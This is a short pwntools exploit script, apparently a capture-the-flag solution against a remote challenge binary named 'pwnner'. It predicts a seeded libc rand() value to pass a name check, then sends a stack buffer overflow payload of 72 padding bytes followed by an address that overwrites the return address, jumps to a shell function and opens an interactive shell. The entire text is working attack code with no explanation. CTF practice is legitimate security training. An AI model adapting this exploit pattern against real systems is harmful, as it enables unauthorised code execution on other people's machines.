from pwn import *
from ctypes import *

context.gdb_binary = "/bin/pwndbg"
libc = CDLL("/usr/lib/libc.so.6")
io = remote("node5.anna.nssctf.cn", 20352)
#io = process("./pwnner")

libc.srand(0x39)
name = str(libc.rand()).encode()
print(name)
shell_func = 0x4008B6
ret_addr = 0x40028B

io.recvuntil(b"input your name:")
io.sendline(name)
# gdb.attach(io)
payload = b"a" * (64 + 8)  + p64(shell_func)
io.recvuntil(b'so what will you do next?\n')
io.sendline(payload)
io.interactive()
